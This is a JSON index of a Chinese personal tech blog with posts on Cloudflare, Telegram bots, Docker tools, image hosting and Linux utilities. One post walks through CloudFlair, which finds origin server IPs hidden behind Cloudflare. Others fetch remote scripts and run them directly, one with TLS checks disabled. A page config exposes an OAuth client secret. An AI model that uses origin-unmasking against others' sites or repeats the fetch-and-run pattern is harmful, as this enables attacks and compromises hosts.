{"pages":[{"title":"","text":"个人简介 分享很喜欢的老罗的一段话： “每一个生命来到世间都注定改变世界，别无选择。要么变得好一点，要么变得坏一点。你如果走进社会为了生存为了什么不要脸的理由，变成了一个恶心的成年人社会中的一员，那你就把这个世界变得恶心了一点点。如果你一生刚正不阿，如果你一生耿直，没有做任何恶心的事情，没做对别人有害的事情，一辈子拼了老命勉强把自己身边的几个人照顾好了，没有成名没有发财，没有成就伟大的事业，然后耿着脖子一生正直，到了七八十岁耿着脖子去世了。你这一生是不是没有改变世界？你还是改变世界了，你把这个世界变得美好了一点点。因为世界上又多了一个好人。“ 善恶终有报,天道好轮回。不信抬头看,苍天饶过谁。无论何时何地，我们都要保持一颗积极乐观、善良感恩的心。但行好事莫问前程，永远年轻，永远热内盈眶，永远保持正能量。💪💪💪💪💪💪冲鸭！！！！ -&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;个人信息：计算机科学与技术专业从事JAVA后端开发码畜一枚坚信代码改变世界 博客信息 网站采用的Icarus主题 追求尽可能的简洁，清晰，易用。 在Icarus主题之上进行了部分修改。 更新日志：–2020.09.20：icarus4.0适配–2020.01.18：icarus3.0适配–2019.11.17：增加深色主题开关–2019.10.30：去图，精简卡片–2019.10.22：改版部分显示，优化速度–2019.10.16：文章列表加上评论数显示–2019.10.13：改版评论–2019.09.25：图片、资源接入CDN免费jsDelivr、文章加入置顶–2019.09.19：开源博客代码–2019.09.19：修改布局，拉伸布局，更宽的展示–2019.09.18：修改友链ui为一行三个，并适配移动端，暗黑模式文章增加评论链接，增加留言链接–2019.09.14：增加精简next主题–2019.09.14：利用中秋节放假，重做了首页的热门推荐、加个widget最新评论框、归档页加入文章贡献概览面板 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page网站cdn优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中gitalk最新评论的获取 博客图片上传picgo工具github图传使用 安装、部分配置icarus主题中文版 技术知识点 Java并发知识点 法律法规 法律法规数据库 中华人民共和国国旗法 中华人民共和国宪法 中华人民共和国消费者权益保护法 中华人民共和国刑事诉讼法 中华人民共和国婚姻法 中华人名共和国网络安全法 中华人民共和国劳动法 其他 网易云音乐歌单分享 计划2020计划 2019.12.31 2020-GOALS 跑两三场马拉松 2019计划 2018.12.31/21:59:00-&gt;更新于2019.12.31 2019-GOALS 购买的专业书籍至少看完一遍（并发、重构、设计模式…）-&gt; 95% 额外： 追了很多剧 总结： 有优点有缺点，没坚持下来的还是太多，追了太多剧。以后多学习，多思考！ 时间轴记录","link":"/Blog/about/index.html"},{"title":"","text":"唐艺昕 李沁 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/Blog/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://removeif.github.io/images/avatar.jpg 网站名称：辣椒の酱 网站地址：https://removeif.github.io 网站简介：后端开发，技术分享 加载中，稍等几秒...","link":"/Blog/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/Blog/media/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/Blog/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/Blog/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/Blog/self-talking/index.html"}],"posts":[{"title":"0成本搭建Telegram私聊机器人","text":"[notice]Telegram是一个跨平台的即时通信软件，它的客户端是自由及开放源代码软件，但是它的服务器是专有软件。用户可以相互交换加密与自毁消息，发送照片、影片等所有类型文件。[/notice] ##新建机器人私聊@BotFather创建新机器人1.使用命令行创建新机器人/newbot，如图所示2.回复机器人名字并以bot结尾，此处以举例为JR_ChatBot3.提示Done，则创建完成，否则按提示重新命名或重新操作一遍4.最后，获得API token ##绑定Bot API私聊@LivegramBot绑定API1.使用命令行创建新机器人/addbot，如图所示2.发送API token[notice-block]到此为止私聊机器人已经搭建完毕，如果你经常接触到 CN（+86） 用户，可能会出现对方无法联系你的情况，此时就需要一个机器人供其联系，机器人转发消息即可。[/notice-block] ##测试图 本文转自:这里","link":"/Blog/2020/08/30/0%E6%88%90%E6%9C%AC%E6%90%AD%E5%BB%BATelegram%E7%A7%81%E8%81%8A%E6%9C%BA%E5%99%A8%E4%BA%BA/"},{"title":"Blaze - 端对端的文件传输免费工具","text":"#前言Blaze 是一款开源免费的“网页版”在线文件传输工具，它有着非常鲜明的特点，就是免安装任何程序，你只需用较为先进的浏览器 (如电脑上的 Chrome、新版 Edge、FireFox；手机上的 Safari、Chrome 等) 访问其网站即可传文件。与网盘完全不同的是，Blaze 通过使用 WebSockets 和 WebRTC 技术，能让你的多个设备实现Peer to Peer「点对点」文件传输，整个传输过程完全无需将文件上传到任何的服务器，而是直接在设备之间连接互传，所以如果你的设备都处于同一局域网内，就能实现不耗费公网流量的高速且安全的内网传输了。 部署起来的话其实是非常简单的，博主使用的是Centos7系统 ##安装epel源 1yum install epel-release ##更新软件 1yum update -y ##安装node.js 1yum install -y nodejs ##拉取代码 12git clone https://github.com/blenderskool/blazegit remote add upstream https://github.com/blenderskool/blaze.git ##部署 1npm run dev 然后会监听3030端口，用ip:3030端口访问 ##后台运行 123yum -y install screen //安装screenscreen -S blaze //进入screennpm run dev //启动blaze","link":"/Blog/2020/07/21/Blaze---%E7%AB%AF%E5%AF%B9%E7%AB%AF%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%85%8D%E8%B4%B9%E5%B7%A5%E5%85%B7/"},{"title":"CloudFlair - 获取藏在 Cloudflare 后的源站IP","text":"具体原理可以查看原作者的文章CloudFlair 开源地址：Github这个工具是用pytohn编写的，兼容python2.7和3.5 #配置 在 https://censys.io/register 注册一个账号 (FREE) 访问https://censys.io/account/api 页面，获取账号的API ID和API secret，并设置到环境变量中 12$ export CENSYS_API_ID='&lt;here-is-your-api-id&gt;'$ export CENSYS_API_SECRET='&lt;here-is-your-api-secret&gt;' 克隆整个仓库 1$ git clone https://github.com/christophetd/cloudflair.git 安装依赖 12$ cd cloudflair$ pip install -r requirements.txt 运行CloudFair 1$ python cloudflair.py example.com #用法 1234567891011121314151617$ python cloudflair.py --helpusage: cloudflair.py [-h] [-o OUTPUT_FILE] [--censys-api-id CENSYS_API_ID] [--censys-api-secret CENSYS_API_SECRET] domainpositional arguments: domain The domain to scanoptional arguments: -h, --help show this help message and exit -o OUTPUT_FILE, --output OUTPUT_FILE A file to output likely origin servers to (default: None) --censys-api-id CENSYS_API_ID Censys API ID. Can also be defined using the CENSYS_API_ID environment variable (default: None) --censys-api-secret CENSYS_API_SECRET Censys API secret. Can also be defined using the CENSYS_API_SECRET environment variable (default: None) python cloudflair.py 后面跟上需要查找的域名即可 一些可选参数解释： 1234567-h, --help 查看帮助 -o OUTPUT_FILE, --output OUTPUT_FILE 输出可能的源站服务器地址到文件中 --censys-api-id CENSYS_API_ID 手动指定Censys API ID --censys-api-secret CENSYS_API_SECRET 手动指定Censys API secret","link":"/Blog/2020/09/07/CloudFlair---%E8%8E%B7%E5%8F%96%E8%97%8F%E5%9C%A8-Cloudflare-%E5%90%8E%E7%9A%84%E6%BA%90%E7%AB%99IP/"},{"title":"CloudFlare 自定义节点优化网站速度 -（附扫描方法）","text":"前言CloudFlare 官网虽然不提供 CNAME/AAAA/A 记录接入 CloudFlare 的 CDN，但是我们可以通过 CloudFlare Partner 免费使用 CNAME/A 记录接入 CloudFlare ，然后就可以解锁许多上网新知识。而我们正好利用 CloudFlare 使用 A 记录接入 CDN 的方式，自定义节点 IP ，例如 1.1.1.1 等，使用 CloudFlare 自定义节点 IP 的好处就是可以一定程度上缓解 CloudFlare 速度慢的问题，据说 CloudFlare 免费套餐节点比较少，且 “鱼龙混杂”，对中国大陆的线路不友好，本文就详细教大家 CloudFlare 如何自定义 IP 节点对三网线路进行优化，以及分享一些 CloudFlare 分别对中国三网线路友好一点的 IP 段，并教大家自己寻找最优的 CloudFlare 的节点 IP ！ 通过CloudFlare Partner 接入 CloudFlare这里推荐 3 个大佬的: 挖站否(推荐)(在挖站否可以申请免费的 railgun但是只有一个节点，付费的话就有很多了） 笨牛 (笨牛） 如优 (王大佬） 添加域名这个相信大家都会了，就不多说了 自定义CDN节点IP 由于 CF 的路由经常进行调整，文章的内容仅供参考，后续应该不会更新这里收集了一些大佬们扫描出来的 IP 优选节点IP:12345678172.64.32.1/24 （推荐移动，走香港） 104.28.14.0/24 （推荐移动，走新加坡） 104.23.240.0-104.23.243.254 （推荐联通、移动，线路未知） 108.162.236.1/24 （推荐联通，走美国） 104.20.157.0/24 （推荐联通，走日本） 104.16.160.1/24 （推荐电信，走洛杉矶） 172.64.0.0/24 （推荐电信，走旧金山） 172.64.32.* （走欧洲） CloudFlare的百度云合作IP:12345678910111213141516171819162.159.208.4-162.159.208.103 162.159.209.4-162.159.209.103 162.159.210.4-162.159.210.103 162.159.211.4-162.159.211.103 162.159.211.4-103 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 104.16.0.0/12 108.162.192.0/18 131.0.72.0/22 141.101.64.0/18 162.158.0.0/15 172.64.0.0/13 173.245.48.0/20 188.114.96.0/20 190.93.240.0/20 197.234.240.0/22 198.41.128.0/17 网友收集的CloudFlare国内友好IP:123456108.162.236.1/24 联通 走美国 172.64.32.1/24 移动 走香港 104.16.160.1/24 电信 走美国洛杉矶 172.64.0.0/24 电信 美国旧金山 104.20.157.0/24 联通 走日本 104.28.14.0/24 移动 走新加坡 其他节点IP:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061104.18.62.1/24 香港hkix.net104.16.35.1/24 香港hkix.net104.16.36.1/24 香港hkix.net104.18.35.1/24 香港hkix.net104.18.36.1/24 香港hkix.net104.16.54.1/24 香港104.16.55.1/24 香港104.18.128.1/24 香港104.18.129.1/24 香港104.18.130.1/24 香港104.18.131.1/24 香港104.18.132.1/24 香港104.19.195.1/24 香港104.19.196.1/24 香港104.19.197.1/24 香港104.19.198.1/24 香港104.19.199.1/24 香港#适合电信的节点104.23.240.*#走欧洲各国出口 英国德国荷兰等 延迟比美国高一些 适合源站在欧洲的网站172.64.32.*#虽然去程走新加坡，但是回程线路的绕路的，实际效果不好，不推荐104.16.160.*#圣何塞的线路，比洛杉矶要快一点，推荐108.162.236.*#亚特兰大线路，延迟稳定，但是延迟较高#适合移动的节点162.158.133.* #走的丹麦，这一段ip只有部分能用，可以自己试一下，绕美国198.41.214.*198.41.212.*198.41.208.*198.41.209.*172.64.32.*141.101.115.*#移动走香港的IP段有很多，以上并不是全部。CF移动走香港的分直连和走ntt的效果都挺不错的，不过部分地区晚上还是会丢包。172.64.0. *#这是走圣何塞的，一般用香港的就行172.64.16.* #欧洲线路.绕#1.0.0.1效果较好电信部分大多数省直接使用1.0.0.0即可，延迟低，丢包少，# 移动部分#新加坡104.18.48.0-104.18.63.255104.24.112.0-104.24.127.255104.27.128.0-104.27.143.255104.28.0.0-104.28.15.255# 移动部分#圣何塞 104.28.16.0-31.255104.27.144.0-243.254104.23.240.0-243.254#香港cloudflare1-100g.hkix.net1.0.0.0-2541.1.1.0-254#香港直连104.16.0.0-79.255104.16.96.0-175.254104.16.192.0-207.255 自动查找最优CloudFlare节点IP如果上面所列出来的 CloudFlare 节点 IP 都不能使用了，博主在这里提供一个由 犯罪高手 大佬写的自动查找最优 CloudFlare 节点 IP bat 脚本下载地址:链接 推荐使用半自动方式查找（可以发给不同地区的网站用户帮忙进行测速）这里引用一下小俊博主的解释 执行 1-自动查找100个丢包最少的IP.bat 设置对 IP 丢包测试 PING 的次数，默认 100 次，可手动设定，推荐 50 次以上。运行完毕后命令行窗口会自动关闭再进行下一步操作 执行 2-对100个丢包最少的IP测速.bat 此过程是利用 curl 下载托管于 cloudflare 的大文件，默认每个 IP下载时间为 10 秒钟。下载结束后到 temp文件夹根据文件大小排序查看下载文件的大小。文件越大，代表单位时间内传输的数据越多，速度就越快。其中文件名是以 IP地址的名称命名的。如果想要对 IP 单线程测速，可参考第三步。如果第三步找不到好用的 IP ，可重新执行第二步，再此完整测速分析 执行 3-单IP测速.bat 输入第二步筛选出来的 IP 地址，回车后进行文件下载速度测试 如果觉得以上步骤过于繁琐，请参照最后一步 懒人版全自动处理，执行 自动查找最优CF节点-懒人专用.bat 等待运行完毕后自动弹出 IP 速度从大到小的排名文本文件该测试的结果不一定能达到预期的效果。","link":"/Blog/2020/04/21/CloudFlare-%E8%87%AA%E5%AE%9A%E4%B9%89%E8%8A%82%E7%82%B9%E4%BC%98%E5%8C%96%E7%BD%91%E7%AB%99%E9%80%9F%E5%BA%A6--%EF%BC%88%E9%99%84%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95%EF%BC%89/"},{"title":"Docker快速搭建GoogleDrive转存Bot - gd-utils","text":"看到有人说搭建不成功，我觉得非常简单，安装版编译时我两台1G的小鸡的卡着不动，还是大鸡编译好小鸡用好,如果只能搭建bot推荐使用docker版 ##准备： SA配置文件(Service Accounts)参考:http://blog.jialezi.net/?post=153 TelegramBot的API,使用BotFather创建时可见 一个可解析的域名 GoogleDrive文件夹的ID Docker镜像(我自用的小修改版 https://hub.docker.com/r/jialezi/gd-utils)原版：https://github.com/gdtool/gd-utils-docker.git ##开始搭建###示例：域名: abc.com (提前解析abc.com到你的服务器IP,用于申请SSL)GoogleDrive文件夹的ID为: 1hhDZw2SKjNeuwWroHSenoY-TXiFZyDoMTelegramBot的API为: 13xxxx2380:AAGDPL_2-LPIA0iQ6RxxxxM9bBOFjtErFGE 下载配置文件，按要求修改里面的参数 1wget https://raw.githubusercontent.com/gdtool/gd-utils-docker/master/config.example.js -O config.js 用SA的修改以下三项即可，其他按需修改const DEFAULT_TARGET = ‘’(必填，拷贝默认目的地ID，如果不指定target，则会复制到此处，建议填写团队盘ID)tg_token: ‘’, // 你的TelegramBot的token,获取方法参考：https://core.telegram.org/bots#6-botfathertg_whitelist: [‘’] // 你的Telegram用户名(t.me/username)，bot只会执行这个列表里的用户所发送的指令 创建SA文件夹上传SA文件到SA文件夹 运行 1docker run --restart=always -idt -e USERPWD=123qwe -p 443:443 -p 80:80 -e Domain=abc.com -v ${PWD}/sa:/gd-utils/sa -v ${PWD}/config.js:/gd-utils/config.js --name gd-utils jialezi/gd-utils 申请SSL需要80端口USERPWD为shellinabox密码Domain=abc.com 为自己域名，要提前解析，由caddy自动申请SSL 对接TelegramBot 1curl -F &quot;url=[YOUR_WEBSITE]/api/gdurl/tgbot&quot; 'https://api.telegram.org/bot[YOUR_BOT_TOKEN]/setWebhook' 例如：curl -F “url=https://abc.com/api/gdurl/tgbot&quot; ‘https://api.telegram.org/bot1394xxx380:AAGDPL_2-LPIA0iQ6xxxxM9bBOFjtErFGE/setWebhook'返回true ok ##访问1.https://abc.com //gd-utils地址2. https://abc.com/shell //shellinabox地址，使用root需要先使用gd用登录，再切换root账号gd，密码在上面自行设置，使用su root切换到root3. https://abc.com/file //filebrowser 账号密码admin","link":"/Blog/2020/07/21/Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAGoogleDrive%E8%BD%AC%E5%AD%98Bot---gd-utils/"},{"title":"Edgeless – 强大而优雅的PE工具","text":"注：以下内容转自Kerry’s Blog 基于 Win10 的PE核心 使用1909作为母盘，提供接近本地Win10系统的体验 支持MBR+UEFI双引导，支持识别主流NVMe协议SSD 提供有线+无线网络连接能力，同时具备较为完整的库文件支持强大的插件包 功能强劲：软件、壁纸、图标、主题、脚本、驱动、库文件… 简单的操作，让您无需具备相应专业知识即可全面定制属于您的启动盘 易于管理：在启动盘指定目录放置.7z插件包即可应用插件，无需专用软件，支持全平台管理插件包 提供开发者文档：插件包原理简单易懂，快速完成开发，使用专为调试插件包设计的开发工具并在交流群寻求帮助优雅的主题包 覆盖全面：启动界面、桌面图标、系统图标、鼠标指针、桌面壁纸、开始菜单样式均可实现修改 控制面板：使用主题包作者提供的控制面板实现更全面的主题沉浸体验 轻松上手，助力开发：专注于内容差异的艺术创作，无需操心底层实现酣畅淋漓 分秒必争 删去不常用的多余组件：Edgeless的定位并非维护PE，因此我们大胆地删除了启动菜单及其他启动内核用不到的组件 寄生启动：业界首次提出“寄生启动”概念，依托于现有启动盘启动Edgeless而无需重新制作启动盘，同时享有更优秀的启动菜单和旧版内核 轻量级架构：镜像启动逻辑与微软官方镜像类似，便于实现更多自定义玩法恪守“三无”原则 无广告：官方PE内核、官方插件、官方网站均无广告 无收费：官方PE内核、官方插件均为永久免费使用，内测交流群永久免费进群，拒绝变相收费 无劫持：官方PE核心、官方插件不会对本地硬盘的系统进行任何恶意修改有胆量就开源 多数原创代码均遵循MPL2.0协议开源：欢迎各位同行在遵循MPL2.0协议的前提下使用我们的原创代码 大量使用解释型代码：使用批处理和PECMD脚本实现功能，无需复杂的逆向操作，Edgeless的运行过程清晰可见 欢迎修改打包形成自己的作品：我们开放了Edgeless内核的修改授权，请前往文档的“合作洽谈”章节查看要求[Edgeless官网}(https://home.edgeless.top/)Edgeless使用手册","link":"/Blog/2020/05/09/Edgeless-%E2%80%93-%E5%BC%BA%E5%A4%A7%E8%80%8C%E4%BC%98%E9%9B%85%E7%9A%84PE%E5%B7%A5%E5%85%B7/"},{"title":"Flarum, 一个轻量化新兴的开源论坛源码","text":"前言说起开源论坛程序，我们都会想到国内两大巨头：Discuz 和 phpwind。一个拥抱腾讯一个拥抱阿里，实力确实不容小视。当然他们本身确实也是做得很强大，不仅仅是论坛，还可以用来做 CMS，企业网站等等。大家都知道虎嗅网一开始也是用的 Discuz！（还有宝塔面板） 所以，程序强大了，也就使得程序本身变得越来越臃肿，对于那些只想单纯做一个论坛的用户来说，很显然这些臃肿的程序已经不适合他们了。于是我们开始寻找国内外的一些其他替代品，轻论坛产品。 国内目前的一些轻论坛产品，像 Xiunobbs，Startbbs 等等，体验下来，总感觉差点意思。 Flarum上个月，一次偶让的机会在网上看到国外一个新兴的开源社区程序 ——Flarum。Flarum 是一款现代的，优雅的，简洁的，强大的论坛软件。Flarum 让在线交流变得更加轻松愉快。虽然现在他只是 Beta 版（已更新到 beta12），但是相信在未来一定会退出正式 版本！(听说开发者走了一个)不过这个开发者的理由有点扯淡Why We’re Building FlarumFlarum 官网并不支持中文，国内衍生了不少 Flarum 中文网，这里推荐两个主要的1.Flarum 中文站：优雅简洁的轻论坛 这个主要是讲官方的代码，主要基于官方的教程翻译而来2.FlarumChina 这个网站主要是基于官方代码进行本土化，二次打包，进行发布，对于新手支持较好这里我个人比较推荐 Flarumchina，他的网站和软件都是同步官方更新的，挺不错。他们的论坛 TowerLight Community 安装教程虚拟机安装可以看 Gitee releases 或者 Github releases，下载压缩包 下面是内置 nginx 和 fpm 的 docker 镜像，据维护者说，在稳定下来之后将会有更多选项，目前代码在此处 以下是环境变量参考: 1234567891011121314151617DEBUG=falseFORUM_URL=http://xxx#FlarumChina 特殊的可以使用 cdn 来加速静态资源，若不使用，请与 FORUM_URL 相同FORUM_CDN = xx DB_HOST=xxDB_NAME=xxDB_USER=xxDB_PASS=xxDB_PREF=xxDB_PORT=3306FLARUM_ADMIN_USER=adminFLARUM_ADMIN_PASS=xxxFLARUM_ADMIN_MAIL=xxx@xxx.comFLARUM_TITLE=xxx 宝塔面板安装安装面板请访问面板信息以获取安装信息。据博主发文前，最新版为 v0.1.0-beta.12 点击前往下载 安装环境此处 Nginx，PHP，Mysql 是必须的，切记。 安装 PHP 插件 网站配置伪静态可以填入这个: 123location / { try_files $uri $uri/ /index.php?$query_string;} 当然最好全部填入: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061location / { try_files $uri $uri/ /index.php?$query_string;}location = /sitemap.xml { try_files $uri $uri/ /index.php?$query_string; }location ~* \\.(?:manifest|appcache|html?|xml|json)$ { add_header Cache-Control &quot;max-age=0&quot;;}location ~* \\.(?:rss|atom)$ { add_header Cache-Control &quot;max-age=3600&quot;;}location ~* \\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|mp4|ogg|ogv|webm|htc)$ { add_header Cache-Control &quot;max-age=2592000&quot;; access_log off;}location ~* \\.(?:css|js)$ { add_header Cache-Control &quot;max-age=31536000&quot;; access_log off;}location ~* \\.(?:ttf|ttc|otf|eot|woff|woff2)$ { add_header Cache-Control &quot;max-age=2592000&quot;; access_log off;}gzip on;gzip_comp_level 5;gzip_min_length 256;gzip_proxied any;gzip_vary on;gzip_types application/atom+xml application/javascript application/json application/ld+json application/manifest+json application/rss+xml application/vnd.geo+json application/vnd.ms-fontobject application/x-font-ttf application/x-web-app-manifest+json application/xhtml+xml application/xml font/opentype image/bmp image/svg+xml image/x-icon text/cache-manifest text/css text/plain text/vcard text/vnd.rim.location.xloc text/vtt text/x-component text/x-cross-domain-policy; 设置运行目录要确保网站根目录结构如下 Apache 请开启 mod_rewrite 并将网站根目录设置到 /path/to/flarum/public Nginx 进行设置 并将网站根目录设置到 /path/to/flarum/public 接下来访问网站，进行设置，就可以了","link":"/Blog/2020/04/21/Flarum,-%E4%B8%80%E4%B8%AA%E8%BD%BB%E9%87%8F%E5%8C%96%E6%96%B0%E5%85%B4%E7%9A%84%E5%BC%80%E6%BA%90%E8%AE%BA%E5%9D%9B%E6%BA%90%E7%A0%81/"},{"title":"GitHub+jsDelivr+PicGo搭建免费图床","text":"[notice]本篇文章主要讲解如何使用PicGo上传并使用jsDelivr加速，当然你也可以手动上传或者加速其他静态文件。[/notice]jsDelivr是一个比较好的CDN平台，官方号称jsDelivr – Open Source CDN free, fast, and reliable，简单来说就是开源的CDN，免费、快、可靠。##使用限制 目前GITHUB仓库容量是没有上限的！不过官方推荐在1G以内！ 仓库单个文件50M会收到警告，大于100M会被拒绝！ jsDelivr仅能针对50M以下的文件CDN加速！放一个测试图：https://img.johnsonran.cn/qndxx/vconsole.jpg来源于：跳过微信青年大学习的方法 ##创建仓库当然，首先你得有个Github的帐号。新建一个仓库，填写仓库名，将权限设置成public，根据需求选择是否为仓库初始化一个README.md描述文件。 ##生成token点击用户头像 -&gt; 选择Settings点击Developer settings点击Personal access tokens并点击Generate new token新建一个Token。填写Token描述，勾选repo，然后点击Generate token生成一个Token。 ##获取Token密钥生成之后会显示Token的密钥，复制保存好。[notice]注意这个Token只会显示一次，自己先保存下来，或者等后面配置好PicGo后再关闭此网页。[/notice] ##配置PicGo进入PicGo官网下载，由于Github的问题下载速度较慢，在这里使用放上CloudFlare加速后的链接:稳定版测试版使用CloudFlare加速Github下载文章链接:点我 设定仓库名：按照用户名/图床仓库名的格式填写 设定分支名：master 设定Token：粘贴之前生成的Token 指定存储路径：填写想要储存的路径，如Pic-Bed/，这样就会在仓库下创建一个名为Pic-Bed的文件夹，图片将会储存在此文件夹中。 设定自定义域名：它的的作用是，在图片上传后，PicGo会按照自定义域名+上传的图片名的方式生成访问链接，放到粘贴板上，因为我们要使用jsDelivr加速访问，所以可以设置为https://cdn.jsdelivr.net/gh/用户名/图床仓库名 ##上传图片配置完成之后，只需要将图片拖动上传即可，然后在相册区可以复制链接了。 ##手动上传直接使用Git或者网页上传图片/文件夹即可官方的访问方法就是：https://cdn.jsdelivr.net/gh/用户名/仓库名@分支名或版本号/文件名例如我在repo根目录下传了一张名为1.jpg的图片，那么文件链接就是https://cdn.jsdelivr.net/gh/lbwnb/Pic-Bed@1.0/1.jpg上面说了也可以不创建releases，就直接用分支代替版本号也是可以的。https://cdn.jsdelivr.net/gh/lbwnb/Pic-Bed@master/1.jpgjsdelivr也可以直接获取仓库目录，格式如下。https://cdn.jsdelivr.net/gh/用户名/仓库名@分支名或版本号/[notice]如果直接使用分支进行访问，例：https://cdn.jsdelivr.net/gh/lbwnb/Pic-Bed@master/1.jpg。master分支会有缓存，缓存应该是一天更新一次。如果想进行及时更新，可以把master直接改成latest即可。格式如下：https://cdn.jsdelivr.net/gh/lbwnb/cdn@latest/1.jpg[/notice] [notice]建议只用作静态文件加速，例如JS/CSS/Image。并不适合大文件分发，大文件分发还是移步国内各厂的对象存储。[/notice]","link":"/Blog/2020/06/30/GitHub+jsDelivr+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"},{"title":"Github访问速度很慢的原因，以及解决方法","text":"##什么是CDNCDN，Content Distribute Network，可以直译成内容分发网络，CDN解决的是如何将数据快速可靠从源站传递到用户的问题。用户获取数据时，不需要直接从源站获取，通过CDN对于数据的分发，用户可以从一个较优的服务器获取数据，从而达到快速访问，并减少源站负载压力的目的。##为什么访问速度慢，下载慢？Github的CDN被某墙屏了，由于网络代理商的原因，所以访问下载很慢。ping github.com 时，速度只有300多ms。##解决方法绕过dns解析，在本地直接绑定host，该方法也可加速其他因为CDN被屏蔽导致访问慢的网站。 hosts文件所在目录: 1C:\\Windows\\System32\\drivers\\etc 修改windows里的hosts文件，添加如下内容 1234567891011121314151617181920212223242526272829# Github Hosts# update: 2020-06-10140.82.113.3 github.com140.82.113.3 github.global.ssl.fastly.net140.82.113.3 nodeload.github.com140.82.113.3 api.github.com140.82.113.3 training.github.com140.82.113.3 codeload.github.com185.199.108.153 assets-cdn.github.com185.199.108.153 documentcloud.github.com185.199.108.153 help.github.com185.199.108.153 githubstatus.com199.232.68.133 raw.github.com199.232.68.133 cloud.githubusercontent.com199.232.68.133 gist.githubusercontent.com199.232.68.133 marketplace-screenshots.githubusercontent.com199.232.68.133 raw.githubusercontent.com199.232.68.133 repository-images.githubusercontent.com199.232.68.133 user-images.githubusercontent.com199.232.68.133 desktop.githubusercontent.com199.232.68.133 avatars0.githubusercontent.com199.232.68.133 avatars1.githubusercontent.com199.232.68.133 avatars2.githubusercontent.com199.232.68.133 avatars3.githubusercontent.com199.232.68.133 avatars4.githubusercontent.com199.232.68.133 avatars5.githubusercontent.com199.232.68.133 avatars6.githubusercontent.com199.232.68.133 avatars7.githubusercontent.com199.232.68.133 avatars8.githubusercontent.com ##Windows下刷新DNS的方法： 12打开cmd输入ipconfig /flushdns 亲测有用，下载速度明显提升","link":"/Blog/2020/06/27/Github%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6%E5%BE%88%E6%85%A2%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"title":"Linux 一键 DD 重装系统","text":"一般情况下主机上加提供的系统镜像中内置了一些奇奇怪怪的东西，可能会对我们的应用运行造成一些负面的影响，这时你就需要一个纯净的系统了，一键 DD 重装就是一个非常不错的选择，让你在无技术的前提下完成系统的一键重装。 #支持重装的系统 Debian 9/10 Ubuntu 18.04/16.04 CentOS 6/7 自定义 DD 镜像 #特征 / 优化 自动获取 IP 地址、网关、子网掩码 自动判断网络环境，选择国内 / 外镜像，再也不用担心卡半天了 超级懒人一键化，无需复杂的命令 CentOS 7 镜像抛弃 LVM，回归 ext4，减少不稳定因素 [notice]注意:重装后系统密码均在脚本中有提供，安装后请尽快修改密码，Linux 系统建议启用密钥登陆。OpenVZ / LXC 架构系统不适用![/notice] #使用方法 1wget --no-check-certificate -O AutoReinstall.sh https://cdn.jsdelivr.net/gh/hiCasper/Shell/AutoReinstall.sh &amp;&amp; chmod +x AutoReinstall.sh &amp;&amp; bash AutoReinstall.sh Linux 密码 Pwd@CentOS Pwd@Linux 修改 Linux 密码 1passwd","link":"/Blog/2020/07/25/Linux-%E4%B8%80%E9%94%AE-DD-%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F/"},{"title":"Linux下的TCP测试工具——TCPING的简明使用教程","text":"前言PING是一种网络工具，用来测试数据包能否通过ICMP协议到到达目标主机，程序会按时间和成功响应的次数估算丢失数据包率。但是相较于ICMP协议，TCP则更为广泛的被大家熟知和使用。下面我们介绍一种新型的网络测试工具——TCPING。 TCPING是基于TCP协议的一种PING命令，用来测试数据包能否通过TCP协议到到达目标主机（其实就是抄上面的描述）。他又一大特点，就是可以监听某个端口的状态，在禁PING的时候，也可以检测网络连通率。闲话少说，开始教程: 前提条件:操作系统:CentOS6+/Debian7+/Ubuntu12+ 开始操作 先更新系统软件源:1234yum update -y#CentOS系统apt-get update -y#Debian/Ubuntu系统 安装依赖，这里用到的是tcptraceroute和bc1234yum install -y tcptraceroute bc#CentOS系统apt-get install -y tcptraceroute bc#Debian/Ubuntu系统 安装TCPING 切换目录到/usr/bin:1cd /usr/bin 下载TCPING:1wget -O tcping http://www.vdberg.org/~richard/tcpping 赋予文件执行权限:1chmod +x tcping 